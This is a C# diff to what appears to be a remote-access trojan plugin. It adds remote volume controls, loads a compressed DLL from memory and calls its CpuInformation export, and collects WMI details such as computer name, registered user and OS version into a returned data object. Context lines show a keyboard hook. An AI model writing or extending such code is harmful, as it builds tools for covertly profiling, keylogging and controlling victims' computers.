@@ -1,5 +1,6 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -126,6 +127,7 @@ namespace Plugin
 			}
 			catch { }		
 		}
+
 		private static void KeyboardThread() 
 		{
             try
@@ -135,6 +137,7 @@ namespace Plugin
 			}
             catch{ }
 		}
+
 		internal static void UnhookKeyboard() 
 		{
 			keyboardHook.AbortHook();
@@ -197,6 +200,67 @@ namespace Plugin
             catch (Exception ex)
             {
 				data.returnError = new ReturnError() { hasError = true, errorDescription = ex.ToString() };
+			}
+		}
+
+		internal static void MuteSound() 
+		{
+			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_MUTE);
+		}
+
+		internal static void SoundUp()
+		{
+			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_UP);
+		}
+
+		internal static void SoundDown() 
+		{
+			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_DOWN);
+		}
+
+		internal delegate IntPtr CPU();
+		internal static void GetInformation(ref byte[] b , ref Data data) 
+		{
+			DLLFromMemory l = new DLLFromMemory(Shared.Compressor.QuickLZ.Decompress(b));
+			CPU C = (CPU)l.GetDelegateFromFuncName("CpuInformation", typeof(CPU));
+			string s = Marshal.PtrToStringUni(C());
+			NativeAPI.Information information = new NativeAPI.Information();
+			Dictionary<string, string> infoList = new Dictionary<string, string>();
+			infoList.Add("CPU", s);
+			infoList.Add("RAM", information.GetRAM() + " KB");
+			infoList.Add("FirmwareType", information.GetFirmwareType());
+
+			WMIHelper(@"\root\CIMV2", "SELECT Caption FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT CSName FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT Manufacturer FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT OSArchitecture FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT OSProductSuite FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT OSType FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT ProductType FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT RegisteredUser FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT SystemDirectory FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT SystemDrive FROM Win32_OperatingSystem", ref infoList);
+			WMIHelper(@"\root\CIMV2", "SELECT Version FROM Win32_OperatingSystem", ref infoList);
+
+			data.DataReturn = new object[] { 
+				infoList
+			};
+			data.returnError = new ReturnError() { hasError = false };
+		}
+
+		private static void WMIHelper(string path, string request, ref Dictionary<string, string> dict) 
+		{
+			WMILib.WMIRequest req = new WMILib.WMIRequest(path, request);
+			req.Request();
+			if (req.RequestReturns.Count == 1)
+			{
+				foreach (var a in req.RequestReturns)
+				{
+					foreach (var c in a)
+					{
+						dict.Add(c.Key, c.Value);
+					}
+				}
 			}
 		}
 	}
